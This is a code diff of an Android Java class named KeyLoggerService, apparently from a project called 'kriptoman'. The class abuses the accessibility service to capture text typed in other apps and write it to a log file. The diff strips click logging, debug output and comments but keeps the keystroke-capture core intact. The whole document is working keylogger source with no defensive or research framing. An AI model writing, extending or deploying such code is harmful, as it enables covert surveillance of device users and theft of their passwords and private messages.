@@ -2,8 +2,6 @@ package com.kriptoman;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
-import android.content.Intent;
-import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
 import java.io.File;
@@ -14,26 +12,17 @@ import java.util.Date;
 import java.util.Locale;
 
 public class KeyLoggerService extends AccessibilityService {
-    private static final String TAG = "KeyLogger";
     private PrintWriter writer;
     private String logFile;
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            // Запись текста
             if (event.getText() != null && !event.getText().isEmpty()) {
                 String text = event.getText().toString();
                 logKey(text);
             }
-        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-            // Можно записывать клики
-            CharSequence content = event.getContentDescription();
-            if (content != null) {
-                logKey("[CLICK] " + content.toString());
-            }
         }
-        // Другие события можно добавить
     }
 
     private void logKey(String text) {
@@ -53,9 +42,7 @@ public class KeyLoggerService extends AccessibilityService {
     }
 
     @Override
-    public void onInterrupt() {
-        // nothing
-    }
+    public void onInterrupt() {}
 
     @Override
     public void onServiceConnected() {
@@ -65,7 +52,6 @@ public class KeyLoggerService extends AccessibilityService {
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
         info.notificationTimeout = 100;
         setServiceInfo(info);
-        Log.d(TAG, "KeyLoggerService запущен");
     }
 
     @Override
